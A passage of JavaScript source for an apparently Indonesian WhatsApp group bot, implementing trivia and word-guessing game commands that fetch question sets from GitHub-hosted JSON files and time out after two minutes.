quoted: tebakkalimat[m.chat][0]
})
if (tebakbendera[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakbendera[m.chat][0]
})
if (tebakgame[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakgame[m.chat][0]
})
if (tebakhero[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakhero[m.chat][0]
})
if (tebakaplikasi[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakaplikasi[m.chat][0]
})
if (tebakgambar[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakgambar[m.chat][0]
})
if (tebakkata[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakkata[m.chat][0]
})
if (asahotak[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: asahotak[m.chat][0]
})
if (lengkapikalimat[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: lengkapikalimat[m.chat][0]
})
//if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (isGame(m.sender, isPremium, isCreator, gcount, glimit)) return m.reply(`Limit game kamu sudah habis`)
if (!isCreator && !isPremium) { gameAdd(m.sender, glimit) }
let anu = await fetchJson('https://raw.githubusercontent.com/Yahyaalmuthahar/database/main/asahotak.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.jawaban)
asahotak[m.chat] = [
await juna.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`, m), result, 250,
setTimeout(() => {
if (asahotak[m.chat]) {
m.reply(waktuHabis(result.jawaban))
delete asahotak[m.chat]
}
}, 120000)
]
}
break
case "lengkapikalimat": {
if (tekateki[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tekateki[m.chat][0]
})
if (caklontong[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: caklontong[m.chat][0]
})
if (susunkata[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: susunkata[m.chat][0]
})
if (tebaktebakan[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebaktebakan[m.chat][0]
})
if (tebaklirik[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebaklirik[m.chat][0]
})
if (tebakkimia[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakkimia[m.chat][0]
})
if (siapaaku[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: siapaaku[m.chat][0]
})
if (tebakkalimat[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakkalimat[m.chat][0]
})
if (tebakbendera[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakbendera[m.chat][0]
})
if (tebakgame[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakgame[m.chat][0]
})
if (tebakhero[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakhero[m.chat][0]
})
if (tebakaplikasi[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakaplikasi[m.chat][0]
})
if (tebakgambar[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakgambar[m.chat][0]
})
if (tebakkata[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakkata[m.chat][0]
})
if (asahotak[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: asahotak[m.chat][0]
})
if (lengkapikalimat[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: lengkapikalimat[m.chat][0]
})
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (isGame(m.sender, isPremium, isCreator, gcount, glimit)) return m.reply(`Limit game kamu sudah habis`)
if (!isCreator && !isPremium) { gameAdd(m.sender, glimit) }
let anu = await fetchJson('https://raw.githubusercontent.com/Yahyaalmuthahar/database/main/lengkapikalimat.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.jawaban)
lengkapikalimat[m.chat] = [
await juna.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`, m), result, 250,
setTimeout(() => {
if (lengkapikalimat[m.chat]) {
m.reply(waktuHabis(result.jawaban))
delete lengkapikalimat[m.chat]
}
}, 120000)
]
}
break
case 'family100': {
if (!m.isGroup) return m.reply(mess.OnlyGrup)
if ('family100'+m.chat in _family100) {
m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
throw false
}
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')
let random = anu[Math.floor(Math.random() * anu.length)]
let hasil = `*Jawablah Pertanyaan Berikut :*\n${random.soal}\n\nTerdapat *${random.jawaban.length}* Jawaban ${random.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}`.trim()
_family100['family100'+m.chat] = {
id: 'family100'+m.chat,
pesan: await juna.sendText(m.chat, hasil, m),
...random,
terjawab: Array.from(random.jawaban, () => false),
hadiah: 6,
}
}
break
case "tebakbendera": {
if (tekateki[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tekateki[m.chat][0]
})
if (caklontong[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: caklontong[m.chat][0]
})
if (susunkata[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: susunkata[m.chat][0]
})
if (tebaktebakan[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebaktebakan[m.chat][0]
})
if (tebaklirik[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebaklirik[m.chat][0]
})
if (tebakkimia[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakkimia[m.chat][0]
})
if (siapaaku[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: siapaaku[m.chat][0]
})
if (tebakkalimat[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakkalimat[m.chat][0]
})
if (tebakkata[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakkata[m.chat][0]
})
if (asahotak[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: asahotak[m.chat][0]
})
if (lengkapikalimat[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: lengkapikalimat[m.chat][0]
})
if (tebakgame[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakgame[m.chat][0]
})
if (tebakhero[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakhero[m.chat][0]
})
if (tebakaplikasi[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakaplikasi[m.chat][0]
})
if (tebakgambar[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakgambar[m.chat][0]
})
if (tebakbendera[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakbendera[m.chat][0]
})
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (isGame(m.sender, isPremium, isCreator, gcount, glimit)) return m.reply(`Limit game kamu sudah habis`)
if (!isCreator && !isPremium) { gameAdd(m.sender, glimit) }
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakbendera2.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.name)
tebakbendera[m.chat] = [
await juna.sendMessage(m.chat, { image: { url: result.img }, caption: `Gambar diatas adalah bendera negara?\n\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._` }, { quoted: m }), result, 250,
setTimeout(() => {
if (tebakbendera[m.chat]) {
m.reply(waktuHabis(result.name))
//juna.sendMessage(m.chat, { delete: tebakbendera[m.chat][0].key })
delete tebakbendera[m.chat]
}
}, 120000)
]
}
break
case 'tebakkalimat': {
if (tekateki[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tekateki[m.chat][0]
})
if (caklontong[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: caklontong[m.chat][0]
})
if (susunkata[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: susunkata[m.chat][0]
})
if (tebaktebakan[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebaktebakan[m.chat][0]
})
if (tebaklirik[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebaklirik[m.chat][0]
})
if (tebakkimia[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakkimia[m.chat][0]
})
if (siapaaku[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: siapaaku[m.chat][0]
})
if (tebakbendera[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakbendera[m.chat][0]
})
if (tebakkata[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakkata[m.chat][0]
})
if (asahotak[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: asahotak[m.chat][0]
})
if (lengkapikalimat[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: lengkapikalimat[m.chat][0]
})
if (tebakgame[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakgame[m.chat][0]
})
if (tebakhero[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakhero[m.chat][0]
})
if (tebakaplikasi[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakaplikasi[m.chat][0]
})
if (tebakgambar[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakgambar[m.chat][0]
})
if (tebakkalimat[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakkalimat[m.chat][0]
})
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (isGame(m.sender, isPremium, isCreator, gcount, glimit)) return m.reply(`Limit game kamu sudah habis`)
if (!isCreator && !isPremium) { gameAdd(m.sender, glimit) }
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.jawaban)
tebakkalimat[m.chat] = [
await juna.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`, m), result, 250,
setTimeout(() => {
if (tebakkalimat[m.chat]) {
m.reply(waktuHabis(result.jawaban))
delete tebakkalimat[m.chat]
}
}, 120000)
]
}
break
case 'tebaksiapa': {
if (tekateki[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tekateki[m.chat][0]
})
if (caklontong[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: caklontong[m.chat][0]
})
if (susunkata[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: susunkata[m.chat][0]
})
if (tebaktebakan[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebaktebakan[m.chat][0]
})
if (tebaklirik[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebaklirik[m.chat][0]
})
if (tebakkimia[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakkimia[m.chat][0]
})
if (tebakkalimat[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakkalimat[m.chat][0]
})
if (tebakbendera[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakbendera[m.chat][0]
})
if (tebakkata[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakkata[m.chat][0]
})
if (asahotak[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: asahotak[m.chat][0]
})
if (lengkapikalimat[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: lengkapikalimat[m.chat][0]
})
if (tebakgame[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakgame[m.chat][0]
})
if (tebakhero[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakhero[m.chat][0]
})
if (tebakaplikasi[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakaplikasi[m.chat][0]
})
if (tebakgambar[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakgambar[m.chat][0]
})
if (siapaaku[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: siapaaku[m.chat][0]
})
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (isGame(m.sender, isPremium, isCreator, gcount, glimit)) return m.reply(`Limit game kamu sudah habis`)
if (!isCreator && !isPremium) { gameAdd(m.sender, glimit) }
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/siapakahaku.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.jawaban)
siapaaku[m.chat] = [
await juna.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`, m), result, 250,
setTimeout(() => {
if (siapaaku[m.chat]) {
m.reply(waktuHabis(result.jawaban))
delete siapaaku[m.chat]
}
}, 120000)
]
}
break
case 'tebakkimia': {
if (tekateki[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tekateki[m.chat][0]
})
if (caklontong[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: caklontong[m.chat][0]
})
if (susunkata[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: susunkata[m.chat][0]
})
if (tebaktebakan[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebaktebakan[m.chat][0]
})
if (tebaklirik[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebaklirik[m.chat][0]
})
if (siapaaku[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: siapaaku[m.chat][0]
})
if (tebakkalimat[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakkalimat[m.chat][0]
})
if (tebakbendera[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakbendera[m.chat][0]
})
if (tebakkata[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakkata[m.chat][0]
})
if (asahotak[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: asahotak[m.chat][0]
})
if (lengkapikalimat[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: lengkapikalimat[m.chat][0]
})
if (tebakgame[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakgame[m.chat][0]
})
if (tebakhero[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakhero[m.chat][0]
})
if (tebakaplikasi[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakaplikasi[m.chat][0]
})
if (tebakgambar[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakgambar[m.chat][0]
})
if (tebakkimia[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakkimia[m.chat][0]
})
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (isGame(m.sender, isPremium, isCreator, gcount, glimit)) return m.reply(`Limit game kamu sudah habis`)
if (!isCreator && !isPremium) { gameAdd(m.sender, glimit) }
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkimia.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.unsur)
tebakkimia[m.chat] = [
await juna.sendText(m.chat, `Apa Arti Dari Simbol : *${result.lambang}*?\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`, m), result, 250,
setTimeout(() => {
if (tebakkimia[m.chat]) {
m.reply(waktuHabis(result.unsur))
delete tebakkimia[m.chat]
}
}, 120000)
]
}
break
case 'tebaklirik': {
if (tekateki[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tekateki[m.chat][0]
})
if (caklontong[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: caklontong[m.chat][0]
})
if (susunkata[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: susunkata[m.chat][0]
})
if (tebaktebakan[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebaktebakan[m.chat][0]
})
if (tebakkimia[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakkimia[m.chat][0]
})
if (siapaaku[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: siapaaku[m.chat][0]
})
if (tebakkalimat[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakkalimat[m.chat][0]
})
if (tebakbendera[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakbendera[m.chat][0]
})
if (tebakkata[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakkata[m.chat][0]
})
if (asahotak[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: asahotak[m.chat][0]
})
if (lengkapikalimat[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: lengkapikalimat[m.chat][0]
})
if (tebakgame[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakgame[m.chat][0]
})
if (tebakhero[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakhero[m.chat][0]
})
if (tebakaplikasi[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakaplikasi[m.chat][0]
})
if (tebakgambar[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakgambar[m.chat][0]
})
if (tebaklirik[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebaklirik[m.chat][0]
})
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (isGame(m.sender, isPremium, isCreator, gcount, glimit)) return m.reply(`Limit game kamu sudah habis`)
if (!isCreator && !isPremium) { gameAdd(m.sender, glimit) }
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.jawaban)
tebaklirik[m.chat] = [
await juna.sendText(m.chat, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`, m), result, 250,
setTimeout(() => {
if (tebaklirik[m.chat]) {
m.reply(waktuHabis(result.jawaban))
delete tebaklirik[m.chat]
}
}, 120000)
]
}
break
case 'tebaktebakan': {
if (tekateki[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tekateki[m.chat][0]
})
if (caklontong[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: caklontong[m.chat][0]
})
if (susunkata[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: susunkata[m.chat][0]
})
if (tebaklirik[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebaklirik[m.chat][0]
})
if (tebakkimia[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakkimia[m.chat][0]
})
if (siapaaku[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: siapaaku[m.chat][0]
})
if (tebakkalimat[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakkalimat[m.chat][0]
})
if (tebakbendera[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakbendera[m.chat][0]
})
if (tebakkata[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakkata[m.chat][0]
})
if (asahotak[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: asahotak[m.chat][0]
})
if (lengkapikalimat[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: lengkapikalimat[m.chat][0]
})
if (tebakgame[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakgame[m.chat][0]
})
if (tebakhero[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakhero[m.chat][0]
})
if (tebakaplikasi[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakaplikasi[m.chat][0]
})
if (tebakgambar[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakgambar[m.chat][0]
})
if (tebaktebakan[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebaktebakan[m.chat][0]
})
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (isGame(m.sender, isPremium, isCreator, gcount, glimit)) return m.reply(`Limit game kamu sudah habis`)
if (!isCreator && !isPremium) { gameAdd(m.sender, glimit) }
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaktebakan.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.jawaban)
tebaktebakan[m.chat] = [
await juna.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`, m), result, 250,
setTimeout(() => {
if (tebaktebakan[m.chat]) {
m.reply(waktuHabis(result.jawaban))
delete tebaktebakan[m.chat]
}
}, 120000)
]
}
break
case 'susunkata': {
if (tekateki[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tekateki[m.chat][0]
})
if (caklontong[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: caklontong[m.chat][0]
})
if (tebaktebakan[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebaktebakan[m.chat][0]
})
if (tebaklirik[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebaklirik[m.chat][0]
})
if (tebakkimia[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakkimia[m.chat][0]
})
if (siapaaku[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: siapaaku[m.chat][0]
})
if (tebakkalimat[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakkalimat[m.chat][0]
})
if (tebakbendera[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakbendera[m.chat][0]
})
if (tebakkata[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakkata[m.chat][0]
})
if (asahotak[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: asahotak[m.chat][0]
})
if (lengkapikalimat[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: lengkapikalimat[m.chat][0]
})
if (tebakgame[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakgame[m.chat][0]
})
if (tebakhero[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakhero[m.chat][0]
})
if (tebakaplikasi[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakaplikasi[m.chat][0]
})
if (tebakgambar[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakgambar[m.chat][0]
})
if (susunkata[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: susunkata[m.chat][0]
})
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (isGame(m.sender, isPremium, isCreator, gcount, glimit)) return m.reply(`Limit game kamu sudah habis`)
if (!isCreator && !isPremium) { gameAdd(m.sender, glimit) }
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/susunkata.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.jawaban)
susunkata[m.chat] = [
await juna.sendText(m.chat, `*Jawablah Pertanyaan Berikut :*\nSoal : ${result.soal}\nTipe : ${result.tipe}\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`, m), result, 250,
setTimeout(() => {
if (susunkata[m.chat]) {
m.reply(waktuHabis(result.jawaban))
delete susunkata[m.chat]
}
}, 120000)
]
}
break
case 'caklontong': {
if (tekateki[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tekateki[m.chat][0]
})
if (susunkata[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: susunkata[m.chat][0]
})
if (tebaktebakan[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebaktebakan[m.chat][0]
})
if (tebaklirik[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebaklirik[m.chat][0]
})
if (tebakkimia[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakkimia[m.chat][0]
})
if (siapaaku[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: siapaaku[m.chat][0]
})
if (tebakkalimat[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakkalimat[m.chat][0]
})
if (tebakbendera[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakbendera[m.chat][0]
})
if (tebakkata[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakkata[m.chat][0]
})
if (asahotak[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: asahotak[m.chat][0]
})
if (lengkapikalimat[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: lengkapikalimat[m.chat][0]
})
if (tebakgame[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakgame[m.chat][0]
})
if (tebakhero[m.chat]) return juna.sendMessage(m.chat, {
